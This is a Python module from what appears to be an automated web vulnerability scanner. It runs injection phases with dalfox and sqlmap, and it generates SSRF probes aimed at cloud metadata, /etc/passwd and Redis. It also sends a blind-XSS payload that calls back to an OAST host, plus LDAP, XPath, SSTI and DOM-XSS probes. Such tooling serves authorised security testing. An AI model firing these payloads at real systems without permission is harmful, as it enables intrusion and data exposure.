"""Injection phases: XSS/SSRF/SQLMap, DOM XSS, SSTI."""
from reconchain.phases.helpers import *


async def phase_11_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11-INJECT"}:
        return {}
    _g_out = outdir / "vulns.txt"
    if _g_out.exists() and not force:
        return {"11-INJECT": str(_g_out), "count": count_nonblank(_g_out)}
    log("info", "Phase 11-INJECT: dalfox → sqlmap → SSRF probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "11-INJECT: no URLs; skipping")
        return {"11-INJECT": str(outdir / "vulns.txt"), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    all_urls = _dedupe_by_normalized_url(all_urls)
    if oast_domain:
        with _ENV_LOCK:
            os.environ["COLLABORATOR"] = oast_domain
    jobs: List[Tuple[str, List[str], int]] = []
    xss_urls = [u for u in all_urls if "=" in u]
    xss_in = ensure(outdir / "urls_xss.txt")
    if xss_urls:
        xss_in.write_text("\n".join(xss_urls) + "\n")
    if xss_urls and t.has("dalfox"):
        # Run pre-filtering tools (kxss, Gxss) BEFORE dalfox since dalfox
        # reads their output files.
        prefilter_jobs: List[Tuple[str, List[str], int]] = []
        kxss_out = outdir / "urls_xss_reflected.txt"
        if t.has("kxss"):
            prefilter_jobs.append((
                "kxss",
                ["kxss", "-l", str(xss_in), "-o", str(kxss_out)],
                600,
            ))
        gxss_out = outdir / "urls_xss_gxss.txt"
        if t.has("Gxss"):
            prefilter_jobs.append((
                "Gxss",
                ["bash", "-c", f"Gxss -o {shlex.quote(str(gxss_out))} < {shlex.quote(str(xss_in))}"],
                900,
            ))
        if prefilter_jobs:
            await run_parallel(prefilter_jobs, outdir)
        # Use Gxss output as dalfox input if kxss is not available
        dalfox_in = (gxss_out if t.has("Gxss") and not t.has("kxss") else
                     kxss_out if t.has("kxss") else xss_in)
        dalfox_cmd = [
            "dalfox", "file", str(dalfox_in), "-S",
            "--output", str(outdir / "xss.txt"),
            "--delay", "500",
            "--no-spinner",
            "--user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "--only-custom-payload",
        ]
        if _PIPELINE_CFG.proxy:
            dalfox_cmd.extend(["--proxy", _PIPELINE_CFG.proxy])
        _dlf_cookie = os.environ.get("COOKIE", "")
        if _dlf_cookie:
            dalfox_cmd.extend(["--cookie", _dlf_cookie])
        _dlf_headers = os.environ.get("EXTRA_HEADERS", "")
        if _dlf_headers:
            for hdr in _dlf_headers.split("\n"):
                hdr = hdr.strip()
                if hdr:
                    dalfox_cmd.extend(["--header", hdr])
        jobs.append(("dalfox", dalfox_cmd, 3600))
    ssrf_urls = [
        u
        for u in all_urls
        if any(k in u.lower() for k in (
            "url=", "uri=", "path=", "dest=", "redirect=", "img=",
            "target=", "site=", "view=", "domain=", "feed=", "host=",
            "to=", "out=", "callback=", "load=", "fetch=", "proxy=",
            "image=", "img_url=", "picture=", "return=", "returnurl=",
            "next=", "continue=", "goto=", "forward=", "port=",
            "endpoint=", "svc=", "api=",
        ))
    ]
    ssrf_in = ensure(outdir / "urls_ssrf.txt")
    if ssrf_urls:
        ssrf_in.write_text("\n".join(ssrf_urls) + "\n")
    # Validate OAST hostname is a single safe token (alnum, dot, dash only)
    # BEFORE splicing it into a script. shlex.quote is belt-and-suspenders.
    if oast_domain and ssrf_urls and _SAFE_HOST.match(oast_domain):
        ssrf_script = outdir / "ssrf_probe.py"
        if ssrf_script.is_symlink():
            ssrf_script.unlink()
        ssrf_script.write_text(
            "#!/usr/bin/env python3\n"
            '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
            "import os, random, sys, urllib.request, urllib.parse, socket\n"
            "_proxy = os.environ.get('PROXY', '')\n"
            "_urlopen = urllib.request.urlopen\n"
            "if _proxy:\n"
            "    if _proxy.startswith(('http://', 'https://')):\n"
            "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
            "        _urlopen = urllib.request.build_opener(_handler).open\n"
            "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
            "        try:\n"
            "            import socks as _socks\n"
            "            from sockshandler import SocksiPyHandler\n"
            "            _parsed = urllib.parse.urlparse(_proxy)\n"
            "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
            "            _handler = SocksiPyHandler(_pt, _parsed.hostname, _parsed.port or 1080)\n"
            "            _urlopen = urllib.request.build_opener(_handler).open\n"
            "        except ImportError:\n"
            "            pass\n"
            f"OAST = {json.dumps(oast_domain)}\n"
            "assert __import__('re').match(r'^[A-Za-z0-9.-]+$', OAST), 'OAST domain contains unsafe characters'\n"
            "SSRF_PARAMS = {\n"
            "    'url', 'uri', 'path', 'dest', 'redirect', 'img', 'target', 'site',\n"
            "    'view', 'domain', 'feed', 'host', 'to', 'out', 'callback', 'load',\n"
            "    'fetch', 'proxy', 'image', 'img_url', 'picture', 'return', 'returnurl',\n"
            "    'next', 'continue', 'goto', 'forward', 'port', 'endpoint', 'svc', 'api',\n"
            "}\n"
            "INTERNAL_TARGETS = [\n"
            "    f'http://{OAST}/ssrf-{{i}}',\n"
            "    'http://169.254.169.254/latest/meta-data/',\n"
            "    'http://[::1]/',\n"
            "    'http://127.0.0.1:8080/',\n"
            "    'http://127.0.0.1:80/',\n"
            "    'http://0.0.0.0:80/',\n"
            "    'http://localhost:80/',\n"
            "    'file:///etc/passwd',\n"
            "    'gopher://127.0.0.1:6379/_',\n"
            "    'dict://127.0.0.1:6379/info',\n"
            "]\n"
            "import uuid\n"
            f"IN = {json.dumps(str(ssrf_in))}\n"
            "with open(IN) as f:\n"
            "    for line in f:\n"
            "        url = line.strip()\n"
            "        if not url:\n"
            "            continue\n"
            "        # Fire a direct HTTP probe to OAST as a ping (independent of param injection)\n"
            "        try:\n"
            "            ping_url = f'http://{OAST}/ssrf-ping/' + uuid.uuid4().hex[:12]\n"
            "            _urlopen(urllib.request.Request(ping_url, method='GET',\n"
            "                headers={'User-Agent': 'Mozilla/5.0'}), timeout=10)\n"
            "        except Exception:\n"
            "            pass\n"
            "        parsed = urllib.parse.urlparse(url)\n"
            "        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)\n"
            "        for param in SSRF_PARAMS:\n"
            "            if param in qs:\n"
            "                for target in INTERNAL_TARGETS:\n"
            "                    test_qs = qs.copy()\n"
            "                    test_qs[param] = [target.format(i=random.randint(0, 99999))]\n"
            "                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)\n"
            "                    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))\n"
            "                    try:\n"
            "                        req = urllib.request.Request(new_url, method='GET',\n"
            "                            headers={'User-Agent': 'Mozilla/5.0'})\n"
            "                        _urlopen(req, timeout=10)\n"
            "                    except Exception:\n"
            "                        pass\n"
        )
        ssrf_script.chmod(0o700)
        jobs.append(("ssrf-probe", ["python3", str(ssrf_script)], 600))
        # Blind XSS — inject a header that will callback to OAST when rendered server-side
        blind_xss_in = ensure(outdir / "urls_xss_blind.txt")
        blind_xss_urls = xss_urls[:_PIPELINE_CFG.sample_urls_xss_blind]
        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
            blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
            blind_script = outdir / "blind_xss_probe.py"
            if blind_script.is_symlink():
                blind_script.unlink()
            _xss_b64 = base64.b64encode(f"fetch('http://{oast_domain}/blind=xss')".encode()).decode()
            blind_script.write_text(
                "#!/usr/bin/env python3\n"
                '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
                "import os, sys, urllib.request, socket\n"
                "_proxy = os.environ.get('PROXY', '')\n"
                "_urlopen = urllib.request.urlopen\n"
                "if _proxy:\n"
                "    if _proxy.startswith(('http://', 'https://')):\n"
                "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
                "        _urlopen = urllib.request.build_opener(_handler).open\n"
                "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
                "        try:\n"
                "            import socks as _socks\n"
                "            from sockshandler import SocksiPyHandler\n"
                "            _parsed = urllib.parse.urlparse(_proxy)\n"
                "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
                "            _handler = SocksiPyHandler(_pt, _parsed.hostname, _parsed.port or 1080)\n"
                "            _urlopen = urllib.request.build_opener(_handler).open\n"
                "        except ImportError:\n"
                "            pass\n"
                f"OAST = {json.dumps(oast_domain)}\n"
                "assert __import__('re').match(r'^[A-Za-z0-9.-]+$', OAST), 'OAST domain contains unsafe characters'\n"
                f"IN = {json.dumps(str(blind_xss_in))}\n"
                f'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("{_xss_b64}"))>\'\n'
                "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                "with open(IN) as f:\n"
                "    for line in f:\n"
                "        url = line.strip()\n"
                "        if not url or '=' not in url:\n"
                "            continue\n"
                "        try:\n"
                "            req = urllib.request.Request(url, method='GET',\n"
                "                headers={'User-Agent': PAYLOAD,\n"
                "                        'Referer': PAYLOAD2,\n"
                "                        'X-Forwarded-For': PAYLOAD})\n"
                "            _urlopen(req, timeout=10)\n"
                "        except Exception:\n"
                "            pass\n"
            )
            blind_script.chmod(0o700)
            jobs.append(("blind-xss-probe", ["python3", str(blind_script)], 300))
    elif oast_domain and ssrf_urls:
        log("warn", "11-INJECT: interactsh domain has unsafe characters, skipping SSRF probes")
    await run_parallel(jobs, outdir)
    # LDAP injection probes on param-bearing URLs
    ldap_findings: List[str] = []
    _ld_urlopen = _get_urlopener()
    _ld_extra_headers = _extra_headers_dict()
    ldap_urls = [
        u for u in all_urls if "=" in u and not _is_static_url(u)
    ][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP_PAYLOADS = ["*", "*)", "*)(uid=*))", "admin*", "*|uid=*", "*)(|(uid=*", "admin(*)"]
    _LDAP_SPECIFIC_INDICATORS = [
        "javax.naming", "ldapexception", "ldap_error", "invalid dn syntax",
        "ldap_no_such_object", "operationserror", "invalidcredentials",
        "ldap_result_entry", "com.sun.jndi.ldap",
    ]
    _LDAP_GENERIC_BASELINE = {"error", "syntax", "malformed"}
    async def _probe_ldap(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP_SPECIFIC_INDICATORS):
                        results.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                    generic_new = {w for w in _LDAP_GENERIC_BASELINE if w in body and w not in baseline_lower}
                    if generic_new:
                        results.append(f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}")
                        break
                except Exception:
                    continue
        return results
    ldap_results = await asyncio.gather(*[_probe_ldap(u) for u in ldap_urls])
    for lr in ldap_results:
        ldap_findings.extend(lr)
    if ldap_findings:
        ensure(outdir / "ldap_injection.txt").write_text("\n".join(ldap_findings) + "\n")
    # XPath injection probes on param-bearing URLs
    xpath_findings: List[str] = []
    _XPATH_PAYLOADS = ["' or '1'='1", "' and '1'='2", "' or 1=1 or '", "'] | //* | //*['"]
    _XPATH_INDICATORS = [
        "xpathexception", "system.xml.xpath", "microsoft.xpath", "saxon",
        "xpathevalerror", "domxpath", "xpathdocument", "xpathnavigator",
        "xpath exception", "xpath error",
    ]
    async def _probe_xpath(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _XPATH_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    _, _, xp_body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    xp_body = xp_body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in xp_body for ind in _XPATH_INDICATORS):
                        results.append(f"[xpath-candidate] {test_url} param={pname} payload={payload}")
                        break
                except Exception:
                    continue
        return results
    xpath_results = await asyncio.gather(*[_probe_xpath(u) for u in ldap_urls])
    for xr in xpath_results:
        xpath_findings.extend(xr)
    if xpath_findings:
        ensure(outdir / "xpath_injection.txt").write_text("\n".join(xpath_findings) + "\n")
    parts = [outdir / "xss.txt", outdir / "sqlmap_findings.txt",
             outdir / "ldap_injection.txt", outdir / "xpath_injection.txt"]
    n = merge_unique([p for p in parts if p.exists()], outdir / "vulns.txt")
    return {"11-INJECT": str(outdir / "vulns.txt"), "count": n}


async def phase_11a_DOMXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11a-DOMXSS"}:
        return {}
    _out = outdir / "domxss_findings.txt"
    if _out.exists() and not force:
        return {"11a-DOMXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 11a-DOMXSS: DOM-based XSS detection via browser automation")
    findings: List[str] = []
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "11a-DOMXSS: no URLs available; skipping")
        return {"11a-DOMXSS": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_domxss]
    if not param_urls:
        log("warn", "11a-DOMXSS: no parameter-bearing URLs; skipping")
        return {"11a-DOMXSS": str(_out), "count": 0}
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log("warn", "11a-DOMXSS: playwright not installed; skipping (pip install playwright)")
        return {"11a-DOMXSS": str(_out), "count": 0}
    _CANARY = "rcxss" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True, args=["--headless=new", "--no-sandbox", "--disable-gpu"])
            try:
                for url in param_urls:
                    await _throttle_rate()
                    context = await browser.new_context(
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    )
                    page = await context.new_page()
                    try:
                        await page.goto(url, timeout=15000, wait_until="domcontentloaded")
                        await page.evaluate(f"""() => {{
                            window.__rc_canary = "{_CANARY}";
                            window.__rc_hits = [];
                            const _eval = window.eval;
                            window.eval = function(s) {{ if(typeof s==='string'&&s.includes(window.__rc_canary)) window.__rc_hits.push('eval'); return _eval.call(window,s); }};
                            const _st = window.setTimeout;
                            window.setTimeout = function(f,d) {{ if(typeof f==='string'&&f.includes(window.__rc_canary)) window.__rc_hits.push('setTimeout(string)'); return _st.call(window,f,d); }};
                            const _fn = window.Function;
                            window.Function = function() {{ const s = Array.from(arguments).join(','); if(s.includes(window.__rc_canary)) window.__rc_hits.push('Function()'); return _fn.apply(this, arguments); }};
                        }}""")
                        await page.evaluate(f"location.hash='#/{_CANARY}'")
                        await asyncio.sleep(1)
                        sink_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            if (document.documentElement && document.documentElement.outerHTML.includes(c)) r.push('outerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in sink_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=location.hash")
                        await page.goto(url.split("#")[0] + "#" + _CANARY, timeout=15000, wait_until="domcontentloaded")
                        await asyncio.sleep(1)
                        frag_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in frag_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=url-fragment")
                        await page.evaluate(f"window.postMessage({{__rc:\"{_CANARY}\"}}, '*')")
                        await asyncio.sleep(1)
                        pm_report = await page.evaluate("""() => {
                            const c = window.__rc_canary;
                            const r = [];
                            if (document.body && document.body.innerHTML.includes(c)) r.push('innerHTML');
                            r.push(...(window.__rc_hits || []));
                            return r;
                        }""")
                        for s in pm_report:
                            findings.append(f"[domxss-sink] {url} — sink={s} source=postMessage")
                    except Exception:
                        continue
                    finally:
                        await context.close()
            finally:
                try:
                    await browser.close()
                except Exception:
                    pass
    except Exception as e:
        log("warn", f"11a-DOMXSS: browser crashed ({e}); saving {len(findings)} partial findings")
    if not findings:
        findings.append("[domxss] No DOM-based XSS candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"11a-DOMXSS: {len(findings)} DOM XSS findings → {out}")
    return {"11a-DOMXSS": str(_out), "count": len(findings)}


async def phase_11b_SQLMAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11b-SQLMAP"}:
        return {}
    _out = outdir / "sqlmap_findings.txt"
    if _out.exists() and not force:
        return {"11b-SQLMAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 11b-SQLMAP: sqlmap with enriched parameter set")
    findings: List[str] = []
    # Collect param-bearing URLs from harvested URLs and Arjun-discovered params
    all_urls: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        all_urls.extend(read_lines(urls_file))
    params_file = prev.get("07-PARAMS", "")
    if params_file and Path(params_file).exists():
        all_urls.extend(read_lines(Path(params_file)))
    deduped = list(dict.fromkeys(all_urls))
    param_urls = [u for u in deduped if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_fuzz]
    if not param_urls:
        log("warn", "11b-SQLMAP: no parameter-bearing URLs available; skipping")
        return {"11b-SQLMAP": str(_out), "count": 0}
    candidates = list(param_urls)
    for url in candidates:
        findings.append(f"[candidate] {url}")
    _sql_extra_headers = _extra_headers_dict()
    # Now run sqlmap on the filtered candidates
    if t.has("sqlmap"):
        sqlmap_in = ensure(outdir / "sqlmap_candidates.txt")
        sqlmap_in.write_text("\n".join(sorted(set(candidates))) + "\n")
        sqlmap_dir = outdir / "sqlmap_11b_output"
        runner = outdir / "logs" / "sqlmap_11b_runner.sh"
        _sql_extra = ""
        if _PIPELINE_CFG.proxy:
            _sql_extra += f" --proxy={shlex.quote(_PIPELINE_CFG.proxy)}"
        _sql_headers = "; ".join(f"{k}: {v}" for k, v in _sql_extra_headers.items())
        if _sql_headers:
            _sql_extra += " --headers=" + shlex.quote(_sql_headers)
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(sqlmap_in))}\n"
            f"DIR={shlex.quote(str(sqlmap_dir))}\n"
            'mkdir -p "$DIR"\n'
            f'sqlmap -m "$IN" --batch --level={_PIPELINE_CFG.sqlmap_level} --risk={_PIPELINE_CFG.sqlmap_risk} --random-agent '
            f'--delay={max(_PIPELINE_CFG.delay, 0)} --time-sec=0 '
            f'{_sql_extra}'
             f' --output-dir="$DIR" > "{shlex.quote(str(outdir / "sqlmap_11b.log"))}" 2>&1\n'
        )
        runner.chmod(0o700)
        await _run("sqlmap-11b", ["bash", str(runner)], 14400, outdir)
        sqlmap_log = outdir / "sqlmap_11b.log"
        if sqlmap_log.exists():
            for ln in read_lines(sqlmap_log):
                lower = ln.lower()
                if any(kw in lower for kw in ("sql injection", "payload:", "type: boolean-based", "type: time-based", "type: union query", "is vulnerable")):
                    if not any(neg in lower for neg in ("not injectable", "not tested", "no parameter")):
                        findings.append(ln)
    else:
        findings.append("[info] sqlmap not installed; skipping automated SQL injection testing")
    if not findings:
        findings.append("[result] No SQL injection vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"11b-SQLMAP: {len(findings)} findings → {out}")
    return {"11b-SQLMAP": str(_out), "count": len(findings)}


async def phase_12_SSTI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"12-SSTI"}:
        return {}
    _g2_out = outdir / "ssti.txt"
    if _g2_out.exists() and not force:
        return {"12-SSTI": str(_g2_out), "count": count_nonblank(_g2_out)}
    log("info", "Phase 12-SSTI: SSTI + deep XSS/SQLi fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "12-SSTI: no URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    all_urls = _dedupe_by_normalized_url(all_urls)
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    if not param_urls:
        log("warn", "12-SSTI: no param-bearing URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}

    eval_map = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "*{7*7}": "49",
        "{{7*'7'}}": "7777777",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
    }

    _SPA_INDICATORS = [
        "window.__nuxt__", "__nuxt", "data-server-rendered",
        "window.__vue__", "__vue_devtools_global_hook__",
        "__next_data__", "_next/static", "react", "reactdom",
        "ng-version", "ng-app", "ng_App", "angular",
    ]

    ssti_findings: List[str] = []
    seen_ssti: Set[str] = set()
    _ssti_extra_headers = _extra_headers_dict()
    _ssti_urlopen = _get_urlopener()
    baseline_counts: Dict[str, Dict[str, int]] = {}
    baseline_spa: Dict[str, bool] = {}

    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )

        if base_url not in baseline_counts:
            try:
                _req_hdr = {"User-Agent": "Mozilla/5.0"}
                _req_hdr.update(_ssti_extra_headers)
                req = urllib.request.Request(base_url, headers=_req_hdr)
                await _throttle_rate()
                _, _, body_bytes = await _async_urlopen(
                    _ssti_urlopen, req, timeout=15
                )
                base_body = body_bytes.decode("utf-8", errors="ignore")
                baseline_counts[base_url] = {
                    exp: base_body.count(exp)
                    for exp in set(eval_map.values())
                }
                base_lower = base_body.lower()
                baseline_spa[base_url] = any(ind in base_lower for ind in _SPA_INDICATORS)
            except Exception:
                baseline_counts[base_url] = {}
                baseline_spa[base_url] = False

        base_expected_counts = baseline_counts[base_url]
        if not base_expected_counts:
            continue

        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, expected in eval_map.items():
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                if test_url in seen_ssti:
                    continue
                seen_ssti.add(test_url)
                await _throttle_rate()
                try:
                    _ssti_req_hdr = {"User-Agent": "Mozilla/5.0"}
                    _ssti_req_hdr.update(_ssti_extra_headers)
                    req = urllib.request.Request(
                        test_url,
                        headers=_ssti_req_hdr,
                    )
                    _, _, body_bytes = await _async_urlopen(_ssti_urlopen, req, timeout=15)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    ssti_count = body.count(expected)
                    is_spa = baseline_spa[base_url]
                    payload_in_body = payload in body

                    if ssti_count > base_expected_counts.get(expected, 0):
                        if is_spa and payload_in_body:
                            ssti_findings.append(
                                f"[SSTI-client-evaluated] {test_url} param={param_name} payload={payload} → {expected} "
                                f"(baseline {base_expected_counts.get(expected, 0)} → {ssti_count}) [SPA page, raw payload present]"
                            )
                        else:
                            ssti_findings.append(
                                f"[SSTI-evaluated] {test_url} param={param_name} payload={payload} → {expected} "
                                f"(baseline {base_expected_counts.get(expected, 0)} → {ssti_count})"
                            )
                    elif payload_in_body:
                        ssti_findings.append(
                            f"[SSTI-reflected-only] {test_url} param={param_name} payload={payload}"
                        )
                except Exception:
                    continue

    ensure(outdir / "ssti.txt").write_text(
        "\n".join(ssti_findings) + ("\n" if ssti_findings else "")
    )
    log("ok", f"12-SSTI: {len(ssti_findings)} SSTI reflections detected")
    return {"12-SSTI": str(outdir / "ssti.txt"), "count": len(ssti_findings)}
